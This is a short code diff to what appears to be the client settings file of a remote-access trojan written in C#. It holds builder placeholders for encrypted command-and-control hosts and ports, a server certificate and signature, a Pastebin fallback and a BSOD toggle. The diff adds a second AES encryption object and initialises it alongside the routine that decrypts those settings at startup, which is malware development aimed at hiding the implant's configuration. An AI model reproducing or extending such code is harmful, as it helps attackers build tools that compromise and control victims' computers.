@@ -22,6 +22,7 @@ namespace Client
         public static string Certifi_cate = "%Certificate%";
         public static string Server_signa_ture = "%Serversignature%";
         public static X509Certificate2 Server_Certificate;
+        public static Aes256Enhanced aes256Enhanced;
         public static Aes256 aes256 = new Aes256(Key);
         public static string Paste_bin = "null";
         public static string BS_OD = "false";
@@ -43,6 +44,7 @@ namespace Client
         public static string Certifi_cate = "%Certificate%";
         public static string Server_signa_ture = "%Serversignature%";
         public static X509Certificate2 Server_Certificate;
+        public static Aes256Enhanced aes256Enhanced;
         public static Aes256 aes256;
         public static string Paste_bin = "%Paste_bin%";
         public static string BS_OD = "%BSOD%";
@@ -62,7 +64,11 @@ namespace Client
             try
             {
                 Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
+                
+                // Initialize both encryption systems
                 aes256 = new Aes256(Key);
+                aes256Enhanced = new Aes256Enhanced(Key);
+                
                 Por_ts = aes256.Decrypt(Por_ts);
                 Hos_ts = aes256.Decrypt(Hos_ts);
                 Ver_sion = aes256.Decrypt(Ver_sion);
